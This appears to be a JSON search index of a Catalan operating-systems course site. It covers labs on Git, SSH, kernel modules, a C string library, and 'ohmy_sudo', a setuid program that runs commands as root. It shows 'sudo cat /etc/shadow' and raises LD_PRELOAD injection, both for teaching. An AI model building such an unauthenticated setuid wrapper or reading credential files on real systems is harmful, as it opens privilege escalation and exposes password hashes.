    "href": "labs/01-lab-introduction.html#laboratori-2-tasques",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 2: Tasques",
    "text": "Laboratori 2: Tasques\n\nConfigurar VSCode per connectar-se a la màquina virtual via SSH.\nProvar la connexió i executar ordres a la màquina virtual des de VSCode\n\n\n📄 Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-3-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-3-objectiu",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 3: Objectiu",
    "text": "Laboratori 3: Objectiu\n\n\n📄 Laboratori 3: Hola món en C a Debian",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-problema-de-les-versions",
    "href": "labs/01-lab-introduction.html#el-problema-de-les-versions",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "El problema de les versions 💾",
    "text": "El problema de les versions 💾\nQuantes vegades us ha passat que heu perdut un document o heu treballat sobre una versió antiga?\n\n\nprojecte_final.docx\nprojecte_final_v1.docx\nprojecte_final_definitiu.docx\n\n\n\nÉs difícil saber quin és l’arxiu correcte, quins canvis s’hi han fet i per què. I si vull recuperar parts d’una versió anterior?",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#la-solució-control-de-versions",
    "href": "labs/01-lab-introduction.html#la-solució-control-de-versions",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "La solució: Control de Versions",
    "text": "La solució: Control de Versions\nImagina’t que cada vegada que fas un canvi important en el teu document:\n\nGuardes una foto del document en aquell moment, amb una descripció dels canvis que has fet.\nAconsegueixes tenir un historial de totes les versions del document.\n\n\nSeria com tenir una màquina del temps per als teus documents!",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#control-de-versions-amb-git",
    "href": "labs/01-lab-introduction.html#control-de-versions-amb-git",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Control de Versions amb Git 🕰️",
    "text": "Control de Versions amb Git 🕰️",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-túnel-del-temps-de-git",
    "href": "labs/01-lab-introduction.html#el-túnel-del-temps-de-git",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "El túnel del temps de Git ⏳",
    "text": "El túnel del temps de Git ⏳",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-multivers-de-git",
    "href": "labs/01-lab-introduction.html#el-multivers-de-git",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "El multivers de Git 🌌",
    "text": "El multivers de Git 🌌",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-4-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-4-objectiu",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 4: Objectiu",
    "text": "Laboratori 4: Objectiu\n\nInstal·lar i configurar el vostre entorn de desenvolupament (IDE) per connectar-vos a la màquina virtual mitjançant SSH i utilitzar Git per al control de versions dels vostres projectes.\nReplicarem l’exemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.\n\n\n📄 Laboratori 4: Git",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#collaboració-en-equip",
    "href": "labs/01-lab-introduction.html#collaboració-en-equip",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Col·laboració en equip 🤝",
    "text": "Col·laboració en equip 🤝\nEn la vostra vida professional, és molt probable que treballeu en equips on diverses persones col·laboren en els mateixos projectes. Necessitareu que tots els membres de l’equip puguin sincronitzar els seus controls de versions i compartir els canvis de manera eficient.\n\nSeria com quan feu fotos amb el vostre mòbil i es guarden automàticament al núvol i les podeu veure en qualsevol moment i des de qualsevol dispositiu i les podeu compartir fàcilment.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#control-de-versions-amb-github",
    "href": "labs/01-lab-introduction.html#control-de-versions-amb-github",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Control de Versions amb GitHub 🐙",
    "text": "Control de Versions amb GitHub 🐙\nGitHub és una plataforma en línia que facilita aquesta col·laboració, us permet mantenir una còpia als seus servidors i compartir els vostres projectes amb altres persones o tenir una còpia de seguretat al núvol per si perdeu la vostra còpia local.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-de-collaboració-amb-github",
    "href": "labs/01-lab-introduction.html#esquema-de-collaboració-amb-github",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Esquema de col·laboració amb GitHub",
    "text": "Esquema de col·laboració amb GitHub",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-5-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-5-objectiu",
    "title": "Laboratori: Virtualització i Control de Versions",
    "section": "Laboratori 5: Objectiu",
    "text": "Laboratori 5: Objectiu\n\nCrear una calculadora col·laborativa utilitzant Git i GitHub.\nAprendre a treballar amb branques i fer merge de canvis.\nPracticar la resolució de conflictes en un entorn de col·laboració.\n\n\n📄 Laboratori 5: Calculadora col·laborativa",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori · Virtualització i Control de Versions"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html",
    "href": "labs/05-procs/lab01.html",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "",
    "text": "Implementació simple de la comanda sudo.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#objectiu",
    "href": "labs/05-procs/lab01.html#objectiu",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "",
    "text": "Implementació simple de la comanda sudo.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#context",
    "href": "labs/05-procs/lab01.html#context",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Context",
    "text": "Context\nLa comanda sudo permet als usuaris executar programes amb els privilegis de seguretat d’un altre usuari, per defecte l’usuari root. Per exemple:\nsudo cat /etc/shadow \n# mostra el contingut del fitxer /etc/shadow\ncat /etc/shadow\n# error de permís denegat",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#descripció-de-lactivitat",
    "href": "labs/05-procs/lab01.html#descripció-de-lactivitat",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Descripció de l’activitat",
    "text": "Descripció de l’activitat\nImplementeu un programa anomenat ohmy_sudo que reprodueixi una funcionalitat bàsica de sudo. Es a dir, el programa ha de permetre a un usuari executar una comanda amb els privilegis de l’usuari root.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#permisos-a-linux",
    "href": "labs/05-procs/lab01.html#permisos-a-linux",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Permisos a Linux",
    "text": "Permisos a Linux\nEls sistemes UNIX/Linux permet controlar QUI pot accedir als fitxers i directoris a través dels permisos. Hi ha tres tipus de permisos: lectura, escriptura i execució. Aquests permisos es poden assignar a tres tipus d’usuaris: owner, group i others.\n\nOwner: Usuari que ha creat el fitxer.\nGroup: Usuaris dels grups.\nOther: Qualsevol usuari del sistema.\n\nEls permisos es representen amb una cadena de 10 caràcters. El primer caràcter indica el tipus de fitxer (per exemple, - per a fitxers normals i d per a directoris). Els següents nou caràcters es divideixen en tres grups de tres caràcters cadascun, que representen els permisos per a l’owner, el group i els others, respectivament. Cada grup de tres caràcters pot contenir els següents caràcters:\n\nr: Permís de lectura.\nw: Permís d’escriptura.\nx: Permís d’execució.\n-: Permís denegat.\n\nPer exemple:\njordi@debianlab:~$ touch a.txt\njordi@debianlab:~$ ls -la a.txt\n-rw-r--r-- 1 jordi jordi 0 11 de jul.  11:26 a.txt\n\nL’usuari jordi és owner del fitxer a.txt i pot llegir/escriure però no executar.\nEls membres del grup jordi poden llegir el fitxer, però no escriure ni executar.\nIgual que la resta d’usuaris.\n\nPer a gestionar els permisos dels fitxers i directoris, utilitzarem la comanda chmod. Aquesta comanda ens permet canviar els permisos d’accés dels fitxers i directoris. La sintaxi de la comanda és la següent:\nchmod [qui] operació permisos fitxer\n\nAmb ls -la fitxer, podem veure els permisos actuals del fitxer.\nAmb chod +x fitxer, afegim el permís d’execució per a tots els usuaris (owner, grup i altres).\nAmb chmod -x fitxer, eliminem el permís d’execució per a tots els usuaris.\nAmb chmod o-r fitxer, eliminem el permís de lectura per a altres usuaris.\nAmb chmod g+w fitxer, afegim el permís d’escriptura per al grup.\nAmb chmod o+w fitxer, afegim el permís d’escriptura per a altres usuaris.\nAmb chmod a-w fitxer, eliminem el permís d’escriptura per a tots els usuaris (owner, grup i altres).\nAmb chmod +w fitxer, afegim el permís d’escriptura a tots els usuaris.\nAmb chmod -r fitxer, eliminem tots els permisos de lectura per a tots els usuaris.\n\nLa comanda chown ens permet canviar l’owner i el grup d’un fitxer o directori. La sintaxi de la comanda és la següent:\nchown [nou_owner][:nou_grup] fitxer\nA més dels permisos bàsics, Linux també permet assignar permisos especials als fitxers i directoris. Aquests permisos especials són:\n\nSetuid (SUID): Permet que un usuari executi un fitxer amb els privilegis de l’owner del fitxer. Aquest permís s’indica amb una s en lloc de la x en els permisos de l’owner. Per exemple, si un fitxer té els permisos -rwsr-xr-x, significa que qualsevol usuari que executi aquest fitxer ho farà amb els privilegis de l’owner del fitxer.\nSetgid (SGID): Permet que un usuari executi un fitxer amb els privilegis del grup del fitxer. Aquest permís s’indica amb una s en lloc de la x en els permisos del grup. Per exemple, si un fitxer té els permisos -rwxr-sr-x, significa que qualsevol usuari que executi aquest fitxer ho farà amb els privilegis del grup del fitxer.\nSticky bit: Permet que només l’owner d’un fitxer o directori pugui eliminar o renombrar els fitxers dins d’un directori. Aquest permís s’indica amb una t en lloc de la x en els permisos dels altres usuaris. Per exemple, si un directori té els permisos drwxrwxrwt, significa que qualsevol usuari pot crear fitxers dins d’aquest directori, però només l’owner dels fitxers pot eliminar-los o renombrar-los.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#implementació",
    "href": "labs/05-procs/lab01.html#implementació",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Implementació",
    "text": "Implementació\nImplementareu el programa ohmy_sudo en C basat en el següent esquelet:\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main( int argc, char* argv[] ){\n    @TODO afegir codi\n    return 0;\n}\nActualizeu el fitxer Makefile per compilar el programa i executar-lo amb els permisos adequats.\nMakefile\nall: ohmy_sudo\n\nohmy_sudo: ohmy_sudo.o\n    gcc $&lt; -o $@\n\nohmy_sudo.o: ohmy_sudo.c\n    gcc -c $&lt; -o $@\n\nconfigure:\n    @TODO permissos\n\ntest:\n    useradd test\n    su test -c './ohmy_sudo whoami'\n    make configure\n    su test -c './ohmy_sudo whoami'\n    userdel test\n\nrun:\n    ./ohmy_sudo $(ARGS)\n\nclean:\n    rm ohmy_sudo.o ohmy_sudo",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#questions-de-reflexió",
    "href": "labs/05-procs/lab01.html#questions-de-reflexió",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Questions de reflexió",
    "text": "Questions de reflexió\n\nQuina diferencia hi ha entre utilitzar un PATH absolut i un PATH relatiu per executar un programa?\nSi en el nostre entorn hi ha la variable LD_PRELOAD=/tmp/mylib.so, què passaria quan executés un programa?\nQuè recomanaries per evitar situacions no desitjades en l’execució de programes amb privilegis elevats?",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 · OhMySudo!"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab01.html",
    "href": "labs/04-kernel/lab01.html",
    "title": "Laboratori 9: Programació de mòduls per al Kernel de Linux",
    "section": "",
    "text": "En aquest laboratori aprendrem a programar mòduls per al kernel de Linux. Aquesta és una de les tasques més complexes que es poden fer en el món de la programació de sistemes. Per això, realitzarem uns exemples senzills per a entendre com es programen els mòduls i com es poden integrar al kernel.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 · Programació de mòduls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab01.html#requisits-previs",
    "href": "labs/04-kernel/lab01.html#requisits-previs",
    "title": "Laboratori 9: Programació de mòduls per al Kernel de Linux",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nMàquina virtual amb Debian.\nRealitzar una snapshot de la màquina virtual abans de començar el laboratori.\nProgramari necessari:\n\nEines de construcció de programari: build-essential\nCapçaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal·lació de les eines necessàries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 · Programació de mòduls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab01.html#tasques",
    "href": "labs/04-kernel/lab01.html#tasques",
    "title": "Laboratori 9: Programació de mòduls per al Kernel de Linux",
    "section": "Tasques",
    "text": "Tasques\n\nExplorant el kernel\n\nObtenir informació sobre la versió del kernel actual:\nuname -r\nEn el meu cas, la versió del kernel és 6.1.0-39-arm64.\nPer veure els mòduls carregats al kernel, podem fer servir la comanda lsmod:\nsu -c \"lsmod\"\nTambé podem fer servir la comanda cat per llegir el fitxer /proc/modules:\nsu -c \"cat /proc/modules\"\nSi volem filtrar un mòdul concret, podem fer servir la comanda grep:\nsu -c \"lsmod | grep fat\"\n\nEls moduls del kernel registren la informació de log en una consola, però per defecte no la podreu veure per la sortida estàndard (sdtout) o la sortida d’error (stderr). Per veure aquesta informació, necessitarem fer servir la comanda dmesg.\nPer exemple, si volem veure els últims missatges del kernel, podem fer servir la comanda:\nsu -c \"dmesg | tail -n 10\"\nAquest missatge provenen dels mòduls del kernel que utilitzen la funció printk per imprimir informació de log. Aquesta funció permet especificar el nivell de log i el mòdul que genera el missatge. Per canviar el nivell de log, podem fer servir la comanda dmesg amb l’opció -n:\nsu -c \"dmesg -n 4\"\nEn aquest cas, el nivell de log és 4, que correspon a WARNING. Això significa que només es mostraran els missatges de log amb nivell WARNING o superior.\nNivells de log disponibles:\n\n0: KERN_EMERG: Missatges d’emergència.\n1: KERN_ALERT: Missatges d’alerta.\n2: KERN_CRIT: Missatges crítics.\n3: KERN_ERR: Missatges d’error.\n4: KERN_WARNING: Missatges d’avís.\n5: KERN_NOTICE: Missatges de notificació.\n6: KERN_INFO: Missatges d’informació.\n7: KERN_DEBUG: Missatges de depuració.\n8: KERN_DEFAULT: Nivell per defecte.\n\n\n\nProgramant un mòdul\nEn aquesta secció, programarem un mòdul senzill per al kernel de Linux. Aquest mòdul imprimirà un missatge d’inici i un missatge de finalització quan es carregui i descarregui al kernel.\n\nCreem un directori per al nostre mòdul:\nmkdir -p $HOME/kernel\ncd $HOME/kernel\nCreem un fitxer anomenat hello.c amb el següent contingut:\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt; \n\nMODULE_LICENSE(\"GPL\");\n\nint init_module(void) {\n    printk(KERN_INFO \"Hello, world!\\n\");\n    return 0;\n}\n\nvoid cleanup_module(void) {\n    printk(KERN_INFO \"Goodbye, world!\\n\");\n}\nCrearem un fitxer Makefile per compilar el nostre mòdul amb el següent contingut:\nCONFIG_MODULE_SIG=n\nobj-m += hello.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n\nNota:\n\nEl fitxer Makefile és sensible a la indentació. Assegureu-vos que utilitzeu tabuladors en lloc d’espais.\nLa variable obj-m indica quin és el mòdul que volem compilar.\nLa variable PWD conté la ruta del directori actual.\n$(shell uname -r) retorna la versió del kernel actual.\nCONFIG_MODULE_SIG=n desactiva la verificació de la signatura del mòdul.\n\n\nCompil·lem el nostre mòdul amb la comanda make:\nmake\n\nTroubleshooting:\n\nSi obteniu un error de missing separator, assegureu-vos que utilitzeu tabuladors en lloc d’espais.\nSi obteniu un error de /lib/modules/, assegureu-vos que teniu instal·lat el paquet linux-headers.\nSi obteniu un error de missing MODULE_LICENSE(), podeu afegir la següent línia al vostre fitxer hello.c:\n\n\nCarreguem el nostre mòdul amb la comanda insmod:\nsu -\ninsmod /home/jordi/laboratoris/lab2-kernel/kernel-modules/hello.ko\n\nNota: Si teniu errors assegureu-vos que esteu executant la comanda com a root. Quan canviem a l’usuari root, la variable $HOME canvia a /root. Per tant, assegureu-vos d’apuntar a la ruta correcta.\n\nComprovem que el mòdul s’ha carregat correctament amb la comanda lsmod:\nlsmod | grep hello\nSi el mòdul s’ha carregat correctament, veureu una sortida similar a aquesta:\nhello                 16384  0\nComprovem els missatges del kernel amb la comanda dmesg:\nsu -c \"dmesg\"\nSi tot ha anat bé, veureu els missatges Hello, world! al final de la sortida.\nDescarreguem el mòdul amb la comanda rmmod:\nrmmod hello\nComprovem que el mòdul s’ha descarregat correctament amb la comanda lsmod:\nlsmod | grep hello\nSi el mòdul s’ha descarregat correctament, hauríeu de veure el missatge Goodbye, world! al final de la sortida de dmesg.\n\nEs poden fer diferents millores i moduls més complexos, però aquest és un exemple senzill per a començar a programar mòduls per al kernel de Linux. Per exemple, podeu afegir més informació al mòdul com llicència, autor, descripció i versió. També podeu utilitzar les macros __init i __exit per optimitzar el mòdul i reduir la memòria utilitzada.\nPer exemple, aquí teniu un exemple millorat del mòdul hello.c:\n#include &lt;linux/init.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"Jordi Mateo\");\nMODULE_DESCRIPTION(\"Hello World OS Kernel Module\");\nMODULE_VERSION(\"0.1\");\n\nstatic int __init hello_init(void) {\n    printk(KERN_INFO \"WOW I AM A KERNEL HACKER!!!\\n\");\n    return 0;\n}\n\nstatic void __exit hello_cleanup(void) {\n    printk(KERN_INFO \"I am dead.\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_cleanup);",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 · Programació de mòduls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "projects/project01.html",
    "href": "projects/project01.html",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "",
    "text": "Entendre i implementar les funcions per operar amb strings (char *) en C.\nAprendre a gestionar la memòria dinàmica de manera segura i eficient amb malloc, calloc, realloc i free.\nDissenyar i implementar llibreries modulars i reutilitzables.\nAplicar bones pràctiques de programació per assegurar la qualitat del codi.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#objectius",
    "href": "projects/project01.html#objectius",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "",
    "text": "Entendre i implementar les funcions per operar amb strings (char *) en C.\nAprendre a gestionar la memòria dinàmica de manera segura i eficient amb malloc, calloc, realloc i free.\nDissenyar i implementar llibreries modulars i reutilitzables.\nAplicar bones pràctiques de programació per assegurar la qualitat del codi.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#entorn-de-desenvolupament",
    "href": "projects/project01.html#entorn-de-desenvolupament",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "🛠️ Entorn de Desenvolupament",
    "text": "🛠️ Entorn de Desenvolupament\n\nLlenguatge de programació: C (estàndard C99 o superior).\nCompilador: gcc.\nEina de construcció: make.\nVM amb Debian.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#estructura-del-projecte",
    "href": "projects/project01.html#estructura-del-projecte",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "🗂️ Estructura del Projecte",
    "text": "🗂️ Estructura del Projecte\nEl projecte es pot realitzar amb grups de fins a 3 persones. Per obtenir el repositori del projecte, heu d’acceptar l’activitat del Github Classroom. Un cop acceptada, el primer membre assignarà un nom a l’equip i la restants membres s’hi podran afegir. Un cop fet això, cada membre haurà de clonar el repositori al seu entorn local.\nLa següent és l’estructura bàsica del projecte:\n├── build            \n├── include           \n│   ├── ohmy_string.h\n│   └── safe_string.h\n├── Makefile          \n├── README.md         \n├── samples           \n├── src               \n│   └── string\n│       ├── ohmy_string.c\n│       └── safe_string.c\n└── tests             \n    ├── graded_test.c\n    ├── graded_test.h\n    ├── test_ohmystring.c\n    └── test_safestring.c\n\n\n\n\n\n\nImportantNo modifiqueu els fitxers de tests\n\n\n\nEls fitxers de tests no s’han de modificar. Aquests fitxers contenen proves automàtiques que s’executaran per verificar la funcionalitat de les llibreries i programes.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#tasques-a-realitzar",
    "href": "projects/project01.html#tasques-a-realitzar",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "📜 Tasques a realitzar",
    "text": "📜 Tasques a realitzar\n\nLlibreria ohmy_string.h\nAquesta llibreria ha de replicar les funcionalitats bàsiques de la llibreria estàndard string.h, implementant funcions com strlen, strcpy, strcat, strcmp, entre altres, sense utilitzar cap funció de la llibreria estàndard.\nchar *ohmy_strcpy(char *dest, const char *src);\nchar *ohmy_strncpy(char *dest, const char *src, size_t n);\nchar *ohmy_strcat(char *dest, const char *src);\nchar *ohmy_strncat(char *dest, const char *src, size_t n);\nsize_t ohmy_strlen(const char *s);\nint ohmy_strcmp(const char *s1, const char *s2);\nint ohmy_strncmp(const char *s1, const char *s2, size_t n);\nchar *ohmy_strchr(const char *s, int c);\nchar *ohmy_strrchr(const char *s, int c);\nchar *ohmy_strstr(const char *haystack, const char *needle);\nchar *ohmy_strrstr(const char *haystack, const char *needle);\nvoid *ohmy_memcpy(void *dest, const void *src, size_t n);\nvoid *ohmy_memmove(void *dest, const void *src, size_t n);\nvoid *ohmy_memset(void *s, int c, size_t n);\nint ohmy_memcmp(const void *s1, const void *s2, size_t n);\n\nImplementeu totes les funcions del fitxer d’encapçalament ohmy_string.h a ohmy_string.c. Com a referència, podeu consultar la documentació oficial del manual de C per a la llibreria string.h o bé les referències de la llibreria musl libc.\nNo es permet l’ús de cap funció de la llibreria estàndard string.h dins de la implementació.\nNo es pot incloure cap altra llibreria a ohmy_string.c ni a ohmy_string.h, excepte les necessàries per a la definició de tipus bàsics (com stddef.h per a size_t(i opcionalment stdint.h o limits.h si ho necessiteu per constants o tipus bàsics)).\nImplementar un conjunt de programes simples que utilitzin les funcions de la llibreria per demostrar-ne el funcionament. Aquests programes s’han de col·locar a la carpeta samples/.\nPots verificar la funcionalitat de la llibreria mitjançant la comanda de test: make test_ohmy. Aquesta comanda compilarà i executarà els tests automàtics definits a tests/test_ohmystring.c.\n\n\n\nLlibreria safe_string.h\nAquest apartat implica el disseny i implementació d’un nou tipus de dada SafeString que gestioni cadenes de caràcters de manera segura. Aquest nou tipus ha d’abordar problemes comuns com desbordaments de búfer, gestió de memòria i accés no controlat, problemes habituals quan es treballa amb cadenes dinàmiques en C.\nPer exemple, l’ús de la llibreria safe_string.h no hauria de permetre:\n\nDesbordaments de búfer\nchar buffer[10];\nstrcpy(buffer, \"Aquesta cadena és massa llarga per al buffer\");\nFugues de memòria\nchar *str = malloc(100);\n// ... ús de str\n// Oblidem alliberar la memòria\nAccessos fora de límits\nchar *str = malloc(10);\nstr[10] = 'A'; // Accés fora de límits\n\nEl tipus SafeString ha de ser una estructura que gestioni el seu propi estat. Ha de contenir, almenys, els següents camps:\n\nPunter al buffer de caràcters.\nLongitud actual de la cadena.\nCapacitat total del buffer assignat (la mida màxima actual).\n\nAquesta estructura ha de ser opaca, és a dir, els usuaris de la llibreria no han de poder accedir directament als seus camps. En lloc d’això, han d’utilitzar les funcions proporcionades per la llibreria per interactuar amb les cadenes. La llibreria no pot exposar cap camp públic que permeti l’accés directe a la memòria interna. Tota operació de modificació (afegir, inserir) ha de comprovar la capacitat i redimensionar l’espai (realloc) si cal.\n\nImplementeu totes les funcions del fitxer d’encapçalament safe_string.h a safe_string.c.\nHeu de fer ús de la llibreria string.h per a les operacions internes amb cadenes.\nPodeu incloure altres llibreries estàndard si és necessari (com stdlib.h per a la gestió de memòria).\nImplementar un conjunt de programes simples que utilitzin les funcions de la llibreria per demostrar-ne el funcionament. Aquests programes s’han de col·locar a la carpeta samples/.\nPots verificar la funcionalitat de la llibreria mitjançant la comanda de test: make test_safe. Aquesta comanda compilarà i executarà els tests automàtics definits a tests/test_safestring.c.\n\n\n\nConfiguració del Makefile\nEl Makefile ha de permetre compilar les dues llibreries (ohmy_string i safe_string), així com els programes de test i els exemples. La versió inicial del Makefile ja està proporcionada, però no està completa per als programes de la carpeta samples/. La resta de funcionalitats del Makefile esta implementada, incloent la compilació de les llibreries i els tests automàtics. Cal afegir les regles necessàries per compilar i executar els programes de la carpeta samples.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#avaluació-i-criteris-de-qualitat",
    "href": "projects/project01.html#avaluació-i-criteris-de-qualitat",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "💯 Avaluació i Criteris de Qualitat",
    "text": "💯 Avaluació i Criteris de Qualitat\nPer avaluar el projecte, es tindran en compte els següents aspectes:\n\n\n\nAspecte\nPuntuació Màxima\n\n\n\n\nohmy_string\n25%\n\n\nsafe_string\n25%\n\n\nsamples\n10%\n\n\nMakefile\n10%\n\n\nDocumentació\n10%\n\n\nQualitat del Codi\n20%\n\n\n\n\nohmy_string: S’avaluarà a través dels tests automàtics proporcionats. Si es passen tots els tests, s’obtindrà la puntuació completa. Si no, es donarà una puntuació proporcional al nombre de tests superats.\nsafe_string: Igual que per ohmy_string, s’avaluarà a través dels tests automàtics proporcionats.\nsamples: S’avaluarà la qualitat, simplicitat i creativitat dels exemples proporcionats a la carpeta samples/.\nMakefile: S’avaluarà la correcta configuració del Makefile, assegurant que compili totes les parts del projecte de manera eficient i sense errors.\nDocumentació: S’avaluarà la profesionalitat i el contingut del fitxer README.md, assegurant que explica:\n\nCom compilar i executar el projecte.\nCom utilitzar les llibreries.\nExemples d’ús de les llibreries.\nDistribució de tasques entre els membres de l’equip (si escau).\n\nQualitat del Codi:\n\nEvitar l’ús de funcions repetides o codi duplicat innecessàriament.\nCodi net i ben estructurat.\nCompilació sense warnings.\nGestió correcta de la memòria (sense fugues ni accessos fora de límits).\nÚs adequat de comentaris i noms de variables descriptius.\nDocumentació basada en estàndards com Doxygen (opcional però recomanat).\nÚs adequat de commits en Git, amb missatges clars i descriptius.\nGestió d’issues.\nGeneració de realease al repositori GitHub amb la versió final del projecte.",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#lliurament",
    "href": "projects/project01.html#lliurament",
    "title": "Pràctica 01: Manipulació de Cadenes de Caràcters en C",
    "section": "📦 Lliurament",
    "text": "📦 Lliurament\nTot el codi i els fitxers del projecte s’han de pujar al repositori GitHub assignat per a la pràctica. És imprescindible assegurar-se que l’execució de la comanda make compili tot el projecte sense errors ni warnings i que tots els tests automàtics s’hagin superat correctament. Es valorarà únicament el codi de la branca principal (main o master).\nPer formalitzar el lliurament al Campus Virtual, copieu i enganxeu el text corresponent a la caixa de text de lliurament del Campus:\nIndividual o Grupal: [Indicar si és Individual o Grupal]\n&lt;Si Grupal&gt;\nMembres: [Llista de Noms, incloent el teu]\nTeam: [Nom del Team al Classroom]\n\n\nHappy Coding! 🚀",
    "crumbs": [
      "Projectes",
      "Pràctica 01 · Manipulació de Cadenes de Caràcters en C"
    ]
  },
  {
    "objectID": "CONTRIBUTING.html",
